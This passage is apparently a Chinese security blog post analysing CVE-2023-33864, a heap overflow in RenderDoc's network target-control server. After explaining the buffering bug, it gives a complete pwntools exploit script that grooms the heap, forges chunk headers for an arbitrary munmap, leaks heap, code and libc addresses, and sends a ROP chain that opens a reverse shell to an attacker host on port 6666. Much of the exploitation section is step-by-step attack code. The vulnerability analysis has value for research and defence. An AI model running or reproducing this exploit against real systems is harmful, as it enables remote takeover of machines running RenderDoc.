从 m_BufferBase 向用户缓冲区拷贝数据时，从 m_BufferHead 指向的位置开始读取，拷贝完成后更新 m_BufferHead 的位置。

```cpp
 bool Read(void *data, uint64_t numBytes)
 {
		......
    // perform the actual copy
    if(data)
      memcpy(data, m_BufferHead, (size_t)numBytes);

    // advance head
    m_BufferHead += numBytes;

    return true;
 }
```

![renderdoc-第 3 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_3_%E9%A1%B5%201.jpg)

若用户请求数据超过 10MB，网络数据直接写入StreamReader::Read第一个参数指定的用户缓冲区，而不经过 m_BufferBase 缓存。

ReadLargeBuffer 函数的作用是写入数据到用户缓冲区。

小于 10MB 的数据请求，数据先进入 m_BufferBase 缓存，再 memcpy 到用户缓冲区。

```cpp
bool Read(void *data, uint64_t numBytes)
{
    ......

    if(m_File || m_Sock || m_Decompressor)
    {
      // 若用户请求的数据大于未读数据长度, 发起套接字读取
      if(numBytes > Available())
      {
        bool success = false;
        bool alreadyread = false;
			// 若用户请求数据超过 10MB, 网络数据直接写入用户缓冲区, 而不经过 m_BufferBase
        if(numBytes >= 10 * 1024 * 1024 && Available() + 128 < numBytes)
        {
      // 网络数据直接写入用户缓冲区
          success = ReadLargeBuffer(data, numBytes);
          alreadyread = true;
        }
        else
        {
      // 若用户请求不超过 10MB, 网络数据先缓存到 m_BufferBase, 后面再拷贝到用户缓冲区
          success = Reserve(numBytes);
        }

        if(!success)
        {
          if(data)
            memset(data, 0, (size_t)numBytes);
          return false;
        }
			// 若用户请求数据超过 10MB, 函数在这里返回
        if(alreadyread)
          return true;
      }
    }
		// 若用户请求不超过 10MB, 在这里发生拷贝
    // perform the actual copy
    if(data)
      memcpy(data, m_BufferHead, (size_t)numBytes);

    // advance head
    m_BufferHead += numBytes;

    return true;
 }

```

### 超长 client name 的处理

握手包的 client name 保存在一个专门的堆缓冲区，我们暂且称之为 string buffer。string buffer 的长度由握手包的 client name length 字段指定。

若 client name 长度小于10MB，那么根据是否大于64KB来决定是否对 m_BufferBase 进行 resize。先从套接字读取 client name 到 m_BufferBase 缓冲区，再拷贝到 string buffer 里面。

若client name长度大于等于10MB， 那么直接从套接字读取数据到 string buffer。

![renderdoc.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc.jpg)

## 漏洞产生的深层次原因

**这个漏洞产生的原因不是通常我们认为的“开发者忽略了什么”，而是设计模式的问题。**

**所以乍一看关于漏洞描述的每个字、每条逻辑都理解明白了，但总觉得哪里还是不对劲，却又说不出哪里不对劲来。**

**仔细分析一下就是对象接口的混用。**

我认为 ReadFromExternal 函数只能对 m_BufferBase 缓存进行写操作，因为ReadFromExternal 函数必须配合 StreamReader 对象的指示器来使用，这些都是围绕网络数据缓存设计的。

接收超长内容（≥10MB）调用的 ReadLargeBuffer 函数是直接对用户指定的缓冲区进行写数据。但是这个函数穿透到底层也是调用 ReadFromExternal 进行套接字的读写，导致了 StreamReader 对象的指示器发生了混乱。

![renderdoc-第 4 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_4_%E9%A1%B5.jpg)

所以虽然表面上漏洞函数是 ReadFromExternal，该函数本身设计的并没有问题。

真正的问题是 StreamReade::ReadLargeBuffer 方法不应该调用 ReadFromExternal，而应该单独设计从套接字读取数据的逻辑来处理超长内容的接收。

```cpp
class StreamReader
{
public:
	......
	
private:
  ......
  bool Reserve(uint64_t numBytes);
  bool ReadLargeBuffer(void *buffer, uint64_t length);
  bool ReadFromExternal(void *buffer, uint64_t length);
  ......

};
```

# 漏洞利用

## 堆的控制能力

### 堆溢出能力

在接收超长内容的时候，可以在两个地方溢出，一是在大于 10MB 的 string buffer，二是在 64KB 的 m_BufferBase。

```cpp
bool StreamReader::ReadLargeBuffer(void *buffer, uint64_t length)
{
  ......
  if(length > 128)
  {
    uint64_t directReadLength = length - 128;

    length -= directReadLength;
    m_ReadOffset += directReadLength;

    if(buffer)
    {
      bool ret = **ReadFromExternal(dest, directReadLength); // 第一处，对string buffer溢出**

      dest += directReadLength;

      // if we failed, return now
      if(!ret)
        return ret;
    }
    ......
  }

  ......
  
  m_BufferHead = m_BufferBase + m_BufferSize;

  // read the 128 bytes
  m_ReadOffset += 128;
  bool ret = **ReadFromExternal(m_BufferHead - 128, 128); // 第二处，对m_BufferBase溢出**

  // memcpy it where it's needed
  if(dest && ret)
    memcpy(dest, m_BufferHead - 128, 128);

  // adjust read offset back for the 'fake' buffer we leave behind
  m_ReadOffset -= m_BufferSize;

  return ret;
}
```

为了精确控制溢出，不至于严重破坏堆的数据结构导致程序不能正常运行，我们不能在两个位置同时造成溢出。

我们可以通过控制 exp 的发送逻辑，仅对 m_BufferBase 进行堆溢出：

```python
s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
packet = p32(0x2 | ChunkCallstackFlag) \
        + p32(0x40) \
        + b'\xff' * 0x200 \
        + p32(0x1) \
        + p32(0) \
        + b'\x00\x00\x00\x01' \
        + b'\xfe' * 16 * 1024 * 1024
# 第一次 send，仅发送 16MB数据，虽然此时已经整数溢出，但确保了 string buffer 不发生溢出，
# 因为只发送了 16MB 数据，没有多余的可供 ReadFromExternal 第二轮接收
s.sendall(packet)

packet = b'b' * 0x80 + p64(0x10050) + p64(0x145) + p64(0xdeadbeefdeadbeef) * 0x26
packet += p64(0xfffffffffec12000) + p64(0x1bef007)
# 第二次 send，此时已经发生了整数溢出，不仅满足 ReadFromExternal 第一轮接收 128字节，
# ReadFromExternal 函数第二轮接收直接导致了堆溢出
s.sendall(packet)
```

### 堆排布能力

- 任意长度堆块分配

可以通过 callstack size 字段和 callstack 字段控制 server 分配任意长度的堆块保存 callstack：

```python
ChunkCallstackFlag = 0x10000

s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
# 0x40，callstack部分的长度，长度单位是sizeof(unsigned long)
# b'\xff' * 0x200，callstack内容
packet = p32(0x2 | ChunkCallstackFlag) \
        + p32(0x40) \
        + b'\xff' * 0x200 \
        + p32(0x1) \
        + p32(0) \
        + b'\x00\x00\x00\x01' \
        + b'\xfe' * 16 * 1024 * 1024

s.sendall(packet)
```

- 堆块释放

TargetControlServerThread 函数是 TCP 线程的主逻辑，它会检查连接进来的 client 是否符合建立调试线程的条件。

若不满足条件，则重新回到while循环的开始，继续监听套接字连接。这个过程会释放掉本轮产生m_BufferBase、string buffer、callstack。

## 漏洞利用思路

利用堆溢出可以覆盖相邻堆块的 prev_size 字段和 size 字段，运用 [House-of-Muney-Heap-Exploitation](http://tukan.farm/2016/07/27/munmap-madness/) 思路构造任意地址 munmap，把堆溢出转化成 UAF。

1. 当 librenderdoc.so 的 TCP 线程创建时，glibc 会 mmap 出一个64MB的空间作为线程的堆，堆区域到其他库文件的映射区域之间存在一片未使用的虚拟内存区域，这片未使用的内存区域被称为GAP。
    
    若 TCP 线程又创建其他线程，子线程的栈区域就从 libraries 边界开始，向低地址方向寻找未使用的内存区域进行开辟。首当其冲的就是 TCP 线程堆到 libraries 映射区域之间的 GAP 区域。
    

```
   0                                       64M
----V----------------------------------------V--------------|-------------
    |          server thread's heap          |  random gap  |  libraries
----|----------------------------------------|--------------|-------------
```

![截屏2025-05-27 15.33.02.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_15.33.02.png)

1. 连续创建/退出 15个 client 调试线程，每个线程都会在当前进程的地址空间分配 8MB + 4KB 的栈空间。这么做的目的是通过内存泄漏把 GAP 消耗殆尽， 起到定位 victim stack 的作用，具体在第 4 步中介绍。
    
    能这么做的是因为程序在处理 client 主动退出的情况时，没有调用 pthread_join 回收栈空间，导致了内存泄漏。
    

```python
for i in range(15):
        sleep(1)
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((ip, port))
        packet = p32(0x2) + p32(0) + p32(9) + p32(0x5) + f'root{i}'.encode() + p32(0) + b'a'*0x40
        s.sendall(packet)
        s.close()
        print(f'thread stack leak {i}')
```

1. 起一个新的连接，这个连接虽然不会起调试线程，但整个过程会分配并释放一个 64KB 的 m_BufferBase 缓存，和一个长度为0x130的 callstack 堆块。

```python
s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
packet = p32(0x2 | ChunkCallstackFlag) \
        + p32(0x26) \
        + b'\x01\x01\x01\x01\x01\x01\x01\x01' * 0x26 \
        + p32(0xe) \
        + p32(9) \
        + p32(0x5) + b'ts588' \
        + p32(0) + b'\x02' * 54
    
s.sendall(packet)
```

![截屏2025-05-27 20.00.34.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.00.34.png)

1. 对 m_BufferBase 缓存制造堆溢出，首先第一次 send 把 m_InputSize 变量变成0x400000

```python
s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
packet = p32(0x2 | ChunkCallstackFlag) \
        + p32(0x40) \
        + b'\xff' * 0x200 \
        + p32(0x1) \
        + p32(0) \
        + b'\x00\x00\x00\x01' \
        + b'\xfe' * 16 * 1024 * 1024
    
s.sendall(packet)
# 0x90 是溢出边界
# 任意控制相邻堆块的 prev_size 字段和 size 字段
# packet = b'b' * 0x1000
# 0xfffffffffec12000 是 0x13EE000 的负数的补码
# glibc mmap的阈值是16MB
packet = b'b' * 0x80 + p64(0x10050) + p64(0x145) + p64(0xdeadbeefdeadbeef) * 0x26
packet += p64(0xfffffffffec12000) + p64(0x1bef007)
s.sendall(packet)
```

可以看到本轮在旧的callstack的后面分配了新的callstack，长度为0x210。旧的callstack被放到了tcache 里面。形成了如下的堆布局：

![renderdoc-第 5 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_5_%E9%A1%B5.jpg)

![截屏2025-05-27 20.08.14.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.08.14.png)

第二次 send 调用，m_BufferBase 缓存发生堆溢出，其中：

old callstack 的 prev_size 和 size 字段保持不变；

new callstack 的 prev_size 字段覆盖为 0xfffffffffec12000，size 字段覆盖为 0x1bef007

![renderdoc-第 6 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_6_%E9%A1%B5.jpg)

![截屏2025-05-27 20.10.16.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.10.16.png)

![截屏2025-05-27 20.15.46.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.15.46.png)

如此溢出是为了释放 new callstack 缓冲区的时候，绕过 munmap_chunk 的检查，实现任意地址、任意长度内存区域的 munmap。

中间之所以要夹一个释放状态的 old callstack，是因为在释放 new callstack 之前会先释放 m_BufferBase ，要通过相邻的 old callstack 来检查 m_BufferBase 是否被破坏。若中间不夹一个 old callstack 那么释放 m_BufferBase 的时候就会 panic。

当释放 new callstack 的时候，new callstack 本身的地址为 0x7fdcac012000，由于堆溢出 prev_size = 0xfffffffffec12000，size = 0x1bef007，这样不仅绕过了if检查，而且最终的 munmap的参数形态为：__munmap((char *) 0x7fdcad400000, 0x81000);

```c
static void munmap_chunk (mchunkptr p)
{
  size_t pagesize = GLRO (dl_pagesize);
  INTERNAL_SIZE_T size = chunksize (p);
  
  assert (chunk_is_mmapped (p));
	...
  uintptr_t mem = (uintptr_t) chunk2mem (p);
  uintptr_t block = (uintptr_t) p - prev_size (p);
  size_t total_size = prev_size (p) + size;
  
  if (__glibc_unlikely ((block | total_size) & (pagesize - 1)) != 0
      || __glibc_unlikely (!powerof2 (mem & (pagesize - 1))))
    malloc_printerr ("munmap_chunk(): invalid pointer");
	...
  __munmap ((char *) block, total_size);
}
```

因此造成了任意地址 munmap，在 GAP 内存区域得到了一块未被映射的内存。

在前面的第 2 步堆喷射中，GAP 区域被全部占满。任意地址 munmap 之后，在 GAP 区域造成了一块长度为 0x81000 的空洞，该空洞距离 new callstack 大约为 19MB。

当下一个 client 调试线程起来的时候，线程栈就会占据这个空洞。

![renderdoc-第 7 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_7_%E9%A1%B5.jpg)

1. 连接 server ，分配一个 client 调试线程，该线程会占据上述内存空洞。
    
    这个线程对应的 client name 是 “tmptmp”，该线程后面是要被替换掉的。
    

```python
def tmp_thread(ip, port):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    packet = p32(0x2) + p32(0) + p32(9) + p32(0x6) + b'tmptmp' + p32(0) + b'a'*0x40
    s.sendall(packet)
    while True:
        pass

th_tmp = threading.Thread(target=tmp_thread, args=(ip, port))
th_tmp.start()
```

1. 重新连接 server ，再起一个 client 调试线程，这个线程要做 3 件事情：
    - 踢掉前面的 tmptmp 线程
    - 分配长度为 0xdee870 的 client name 字符串（大约 13MB）
    - 起了新的调试线程代替之前的 tmptmp线程

```python
def long_live_thread(ip, port):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    packet = p32(0x2) + p32(0) + p32(9) + \
        p32(0xdee870) + b'\x03' *  0xdee870
        
    s.sendall(packet)
    # kick 字段设置为1，表示踢掉前面的 tmptmp 线程
    packet = b'\x04' * 0x80 + p32(1)
    s.sendall(packet)
    while True:
        pass

th_long_live = threading.Thread(target=long_live_thread, args=(ip, port))
th_long_live.start()
```

踢掉 tmptmp 线程是为了回收内存空洞，设置 kick 字段为1，server 就会对 tmptmp 线程调用pthread_join 回收线程资源，0x81000 的栈就会被 pthread 回收，这个回收并不是释放给系统，而是加入到了 pthread 维护的一个链表，下次 pthread_create 线程的时候从链表中取出给新的线程使用。

分配长度为 0xdee870 的 client name。

client name 会被复制一次，因此总共会分配两个连续的堆块用于存放 client name，总长度大约 26MB，正好覆盖到部分的内存空洞。

![截屏2025-05-27 21.31.00.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.31.00.png)

![renderdoc-第 8 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_8_%E9%A1%B5.jpg)

这部分内存空洞虽然已被使用，但是归属于 vma 子系统管理，堆管理器并不能感知到这块被任意 munmap出来的区域正在使用。所以在扩展堆空间的时候，直接调用mprotect将这块空洞包含在内的区域设置为RW就返回给 malloc 使用，造成了 client name 侵占部分的空洞。

随后起了新的调试线程替代之前的 tmptmp 线程。新的调试线程从 pthread 维护的链表中取得了刚被释放的长度为0x81000的栈，往这块区域写入了栈数据，覆盖了部分的 client name，后面当server 把 client name 返回给 client 的时候就会把这部分栈数据带出来，其中就包含了攻击者想要的指针信息。

1. 泄漏堆指针、代码段指针、libc 指针

这时候再连进去一个 client，kick字段设置为0。

当client进去后发现有调试线程正在运行，由于 kick = 0，server 不起新的调试线程，把已存在的 client name 返回给当前请求。

由于 client name 部分已被调试线程的栈所覆盖，其中必然遗留了代码段地址。

![截屏2025-05-27 21.38.48.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.38.48.png)

![截屏2025-05-27 21.51.09.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.51.09.png)

```python
s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
    
# do not kick out the long-live thread
packet = p32(0x2) + p32(0) + p32(9) + \
			   p32(0x6) + b'qts588' + p32(0) + b'a'*0x40
        
s.sendall(packet)
    
recv_buf = b''
while True:
    recv_buf = s.recv(2048)
    if recv_buf.find(b'\x10\x00\x00\x00\x03\x03\x03\x03') != -1:
        break
    
tag_index = recv_buf.find(b'\x10\x00\x00\x00\x03\x03\x03\x03')
heap_addr = u64(recv_buf[tag_index+80 : tag_index+88].ljust(8, b'\x00'))
text_addr = u64(recv_buf[tag_index+88 : tag_index+96].ljust(8, b'\x00'))
libc_addr = u64(recv_buf[tag_index+40 : tag_index+48].ljust(8, b'\x00'))
```

1. 再次连进去一个 client ，其中 kick = 0，client name 部分构造 rop 链。
    
    新的 client name 彻底覆盖了调试线程的栈，我们可以在栈上面大量喷洒 ret 指令的地址，当 19 号线程的某个函数返回的时候就会进入 ret 滑板地址，一直滑到 rop 的反弹shell部分。
    
    由于堆地址在第 7 步中已经泄漏出来，因此我们很容易定位 “/bin/bash” 字符串的地址。
    

![renderdoc-第 9 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_9_%E9%A1%B5.jpg)

```python
rop_chain = b'/bin/sh\x00'
#struct sockaddr_in   172.17.0.1:6666
rop_chain += p64(0x010011ac0a1a0002) + p64(0x0000556b2b358120)
    
rop_chain += p64(ret_addr) * 0x26c
# int fd = socket(AF_INET, SOCK_STREAM, 0);
rop_chain += p64(pop_rdi_ret_addr) + p64(AF_INET)
rop_chain += p64(pop_rsi_ret_addr) + p64(SOCK_STREAM)
rop_chain += p64(pop_rdx_ret_addr) + p64(0)
rop_chain += p64(socket_addr)
# dup2(7, 0)
rop_chain += p64(pop_rdi_ret_addr) + p64(7)
rop_chain += p64(pop_rsi_ret_addr) + p64(0)
rop_chain += p64(dup2_addr)
# dup2(7, 1)
rop_chain += p64(pop_rdi_ret_addr) + p64(7)
rop_chain += p64(pop_rsi_ret_addr) + p64(1)
rop_chain += p64(dup2_addr)
# dup2(7, 2)
rop_chain += p64(pop_rdi_ret_addr) + p64(7)
rop_chain += p64(pop_rsi_ret_addr) + p64(2)
rop_chain += p64(dup2_addr)
# connect(fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
rop_chain += p64(pop_rdi_ret_addr) + p64(7)
rop_chain += p64(pop_rsi_ret_addr) + p64(sockaddr_addr)
rop_chain += p64(pop_rdx_ret_addr) + p64(16)
rop_chain += p64(connect_addr)
# execv("/bin/sh", NULL)
rop_chain += p64(pop_rdi_ret_addr) + p64(binsh_addr) 
rop_chain += p64(pop_rsi_ret_addr) + p64(0)
rop_chain += p64(execv_addr)
rop_chain.rjust(0x900000, b'\x00')
    
p = remote(ip, port, )
packet = p32(0x2) + p32(0) + p32(0) + \
         p32(0x900000) + rop_chain + \
         p32(0) + b'a'*0x40
             
p.sendline(packet)
```

## 漏洞利用代码

```python
#!/usr/bin/python

# Author: qiutianshu
# Date: 2025/05/21

from pwn import *
from socket import *
import sys
import threading

text_off = 0x8e000
ret_offset = 0x8E01A - text_off
pop_rdi_ret = 0x560a27 - text_off
pop_rsi_ret = 0x164dfe - text_off
pop_rdx_ret = 0xe4192- text_off
pop_rax_ret = 0x21c987 - text_off
pop_rbx_ret = 0x1d73d5 - text_off
pop_rcx_ret = 0x2235f2 - text_off
xchg_rdi_rax_ret = 0x146eebc - text_off

def tmp_thread(ip, port):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    packet = p32(0x2) + p32(0) + p32(9) + p32(0x6) + b'tmptmp' + p32(0) + b'a'*0x40
    s.sendall(packet)
    while True:
        pass

def long_live_thread(ip, port):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    packet = p32(0x2) + p32(0) + p32(9) + \
        p32(0xdee870) + b'\x03' *  0xdee870
        
    s.sendall(packet)
    packet = b'\x04' * 0x80 + p32(1)
    s.sendall(packet)
    while True:
        pass

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <ip> <port>')
        sys.exit(0)
    
    ip = sys.argv[1]
    port = int(sys.argv[2])
    ChunkCallstackFlag = 0x00010000

# step 1: 制造内存泄露，填补server线程到库文件之间的gap
# 
#     0                                       64M
# ----V----------------------------------------V--------------|-------------
#     |          server thread's heap          |  random gap  |  libraries
# ----|----------------------------------------|--------------|-------------
#
#  建立7个连续的连接, 每个连接会 clone 出一个新的线程，每个线程glibc会分配 8MB + 4KB 的栈空间
#  目的是为了缩小 server thread 堆到库文件映射之间的gap。
#  新的线程因为不满足校验而退出，但源程序没有用到pthread_join，造成了每个线程的 8MB + 4KB 内存泄露
# 
    for i in range(15):
        sleep(1)
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((ip, port))
        packet = p32(0x2) + p32(0) + p32(9) + p32(0x5) + f'root{i}'.encode() + p32(0) + b'a'*0x40
        s.sendall(packet)
        s.close()
        print(f'thread stack leak {i}')
        
		# step 2：
    # ePacket_Handshake | ChunkCallstackFlag
    # + CallstackSize (实际会分配 CallstackSize x 8 大小的堆块)
    # + CallstackContent 
    # + p32(1)   
    # + clientname 的长度
    # + clientname  
    # + p32(0xe)是控制 m_ChunkMetadata.length 字段的
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    packet = p32(0x2 | ChunkCallstackFlag) \
            + p32(0x26) \
            + b'\x01\x01\x01\x01\x01\x01\x01\x01' * 0x26 \
            + p32(0xe) \
            + p32(9) \
            + p32(0x5) + b'ts588' \
            + p32(0) + b'\x02' * 54
    
    s.sendall(packet)
    # step 3:
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    packet = p32(0x2 | ChunkCallstackFlag) \
            + p32(0x40) \
            + b'\xff' * 0x200 \
            + p32(0x1) \
            + p32(0) \
            + b'\x00\x00\x00\x01' \
            + b'\xfe' * (16 * 1024 - 1) * 1024 \
            + b'\xfd' * 1024 
    
    s.sendall(packet)
    
    # 0x90 是溢出边界
    # 任意控制相邻堆块的 prev_size 字段和 size 字段
    # packet = b'b' * 0x1000
    # 0xfffffffffec12000 是 0x13EE000 的负数的补码
    # glibc mmap的阈值是16MB
    packet = b'b' * 0x80 + p64(0x10050) + p64(0x145) + p64(0xdeadbeefdeadbeef) * 0x26
    packet += p64(0xfffffffffec12000) + p64(0x1bef007)
    s.sendall(packet)
    
    # step 4:
    print("step 4: create a temp thread")
    th_tmp = threading.Thread(target=tmp_thread, args=(ip, port))
    th_tmp.start()
    sleep(1)
    
    # step 5:
    print("step 5: create a long-live thread, kick out previous tmp thread")
    th_long_live = threading.Thread(target=long_live_thread, args=(ip, port))
    th_long_live.start()
    
    # step 6: information leak
    print("step 6: leak the content of long-live thread stack")
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    
    # do not kick out the long-live thread
    packet = p32(0x2) + p32(0) + p32(9) + \
        p32(0x6) + b'qts588' + p32(0) + b'a'*0x40
        
    s.sendall(packet)
    
    recv_buf = b''
    while True:
        recv_buf = s.recv(2048)
        if recv_buf.find(b'\x10\x00\x00\x00\x03\x03\x03\x03') != -1:
            break
    
    tag_index = recv_buf.find(b'\x10\x00\x00\x00\x03\x03\x03\x03')
    heap_addr = u64(recv_buf[tag_index+80 : tag_index+88].ljust(8, b'\x00'))
    text_addr = u64(recv_buf[tag_index+88 : tag_index+96].ljust(8, b'\x00'))
    libc_addr = u64(recv_buf[tag_index+40 : tag_index+48].ljust(8, b'\x00'))
    
    heap_off = 0x7fe0edbff430 - 0x7fe0ed400000
    text_off = 0x7fe0f38350d4 - 0x7fe0f21f7000
    libc_off = 0x7f00168657af - 0x7f0016767000
    binsh_off = 0x7f8b55bff3d0 - 0x7f8b55400000
    
    heap_base = heap_addr - heap_off
    text_base = text_addr - text_off
    libc_base = libc_addr - libc_off
    
    dup2_addr = 0x10EAE0 + libc_base - 0x22000
    execv_addr = 0xE32D0 + libc_base - 0x22000
    setsockopt_addr = 0x120960 + libc_base - 0x22000
    socket_addr = 0x1209C0 + libc_base - 0x22000
    connect_addr = 0x1203B0 + libc_base - 0x22000
    ret_addr = ret_offset + text_base
    pop_rdi_ret_addr = pop_rdi_ret + text_base
    pop_rsi_ret_addr = pop_rsi_ret + text_base
    pop_rax_ret_addr = pop_rax_ret + text_base
    pop_rbx_ret_addr = pop_rbx_ret + text_base
    pop_rcx_ret_addr = pop_rcx_ret + text_base
    pop_rdx_ret_addr = pop_rdx_ret + text_base
    xchg_rdi_rax_ret_addr = xchg_rdi_rax_ret + text_base
    binsh_addr = binsh_off + heap_base
    sockaddr_addr = binsh_addr + 0x8
    
    
    print(f'heap base address: {hex(heap_base)}')
    print(f'text base address: {hex(text_base)}')
    print(f'libc base address: {hex(libc_base)}')
    print(f'dup2  address: {hex(dup2_addr)}')
    print(f'execve  address: {hex(execv_addr)}')
    print(f'ret gadget address: {hex(ret_addr)}')
    print(f'pop_rdi_gadget gadget address: {hex(pop_rdi_ret_addr)}')
    print(f'pop_rsi_gadget gadget address: {hex(pop_rsi_ret_addr)}')
    print(f'xchg_rdi_rax_ret gadget address: {hex(xchg_rdi_rax_ret_addr)}')
    print(f'pop_rax_gadget gadget address: {hex(pop_rax_ret_addr)}')
    print(f'pop_rbx_gadget gadget address: {hex(pop_rbx_ret_addr)}')
    print(f'pop_rcx_gadget gadget address: {hex(pop_rcx_ret_addr)}')
    print(f'pop_rdx_gadget gadget address: {hex(pop_rdx_ret_addr)}')
    print(f'binsh address: {hex(binsh_addr)}')
    
    # step 7: spawn a remote shell
    # fd = 6
    rop_chain = b'/bin/sh\x00'
    #struct sockaddr_in
    rop_chain += p64(0x010011ac0a1a0002) + p64(0x0000556b2b358120)
    
    rop_chain += p64(ret_addr) * 0x26c
    # int fd = socket(AF_INET, SOCK_STREAM, 0);
    rop_chain += p64(pop_rdi_ret_addr) + p64(AF_INET)
    rop_chain += p64(pop_rsi_ret_addr) + p64(SOCK_STREAM)
    rop_chain += p64(pop_rdx_ret_addr) + p64(0)
    rop_chain += p64(socket_addr)
    # dup2(7, 0)
    rop_chain += p64(pop_rdi_ret_addr) + p64(7)
    rop_chain += p64(pop_rsi_ret_addr) + p64(0)
    rop_chain += p64(dup2_addr)
    # dup2(7, 1)
    rop_chain += p64(pop_rdi_ret_addr) + p64(7)
    rop_chain += p64(pop_rsi_ret_addr) + p64(1)
    rop_chain += p64(dup2_addr)
    # dup2(7, 2)
    rop_chain += p64(pop_rdi_ret_addr) + p64(7)
    rop_chain += p64(pop_rsi_ret_addr) + p64(2)
    rop_chain += p64(dup2_addr)
    # connect(fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    rop_chain += p64(pop_rdi_ret_addr) + p64(7)
    rop_chain += p64(pop_rsi_ret_addr) + p64(sockaddr_addr)
    rop_chain += p64(pop_rdx_ret_addr) + p64(16)
    rop_chain += p64(connect_addr)
    # execv("/bin/sh", NULL)
    rop_chain += p64(pop_rdi_ret_addr) + p64(binsh_addr) 
    rop_chain += p64(pop_rsi_ret_addr) + p64(0)
    rop_chain += p64(execv_addr)
    rop_chain.rjust(0x900000, b'\x00')
    
    p = remote(ip, port, )
    packet = p32(0x2) + p32(0) + p32(0) + \
             p32(0x900000) + rop_chain + \
             p32(0) + b'a'*0x40
             
    p.sendline(packet)
    print("**** enjoy reverse shell on '$ nc -lvnp 6666'  ****")
```

运行结果：

![批注 2025-05-21 093704.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-21_093704.png)

# pwndbg命令学习

- info thread：查看线程信息

```bash
pwndbg> info thread
  Id   Target Id                                          Frame 
  1    Thread 0x7f500cf56dc0 (LWP 2989) "sleep"           0x00007f500d54223f in __GI___clock_nanosleep (clock_id=clock_id@entry=0, 
    flags=flags@entry=0, req=0x7ffd00b15e60, rem=0x0) at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
* 2    Thread 0x7f500cf53700 (LWP 2991) "TargetControlSe" 0x00007f500d54223f in __GI___clock_nanosleep (clock_id=clock_id@entry=0, 
    flags=flags@entry=0, req=req@entry=0x7f500cf52ae0, rem=rem@entry=0x0) at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
```

- thread id：切换到线程id，后面的heap等命令查看的就是某个线程的堆了

```bash
pwndbg> thread 2
[Switching to thread 2 (Thread 0x7f500cf53700 (LWP 2991))]
#0  0x00007f500d54223f in __GI___clock_nanosleep (clock_id=clock_id@entry=0, flags=flags@entry=0, req=req@entry=0x7f500cf52ae0, 
    rem=rem@entry=0x0) at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
78      in ../sysdeps/unix/sysv/linux/clock_nanosleep.c
```

- ignore break_point_num NUM：break_point_num 断点命中第NUM次后断下

```bash
pwndbg> info break
Num     Type           Disp Enb Address            What
4       breakpoint     keep y   0x00007f4d57ced01e in RenderDoc::TargetControlServerThread(Network::Socket*) at /test/renderdoc/renderdoc/core/target_control.cpp:473
        breakpoint already hit 9 times
pwndbg> ignore 4 8
Will ignore next 8 crossings of breakpoint 4.
```

# 参考资料

[munmap madness · Online tukan sanctuary](http://tukan.farm/2016/07/27/munmap-madness/)

```
Exploitation
------------------------------------------------------------------------

1/ When librenderdoc.so's server thread is created, the glibc's malloc
allocates a new "heap" for this thread: 64MB of mmap()ed memory, whose
start address is aligned on a multiple of 64MB. Initially, this heap is
mmap()ed PROT_NONE, and is mprotect()ed read-write as needed by malloc:

    0                                       64M
----V----------------------------------------V--------------|-------------
    |          server thread's heap          |  random gap  |  libraries
----|----------------------------------------|--------------|-------------

Note: the gap of unmapped memory between the heap and the libraries is
random (and smaller than 64MB), because the heap is aligned on 64MB but
the libraries are randomly aligned on 4KB (or sometimes 2MB) by ASLR.

2/ We (remote attackers) establish 7 successive connections to the
server on TCP port 38920: for each one of these connections, the server
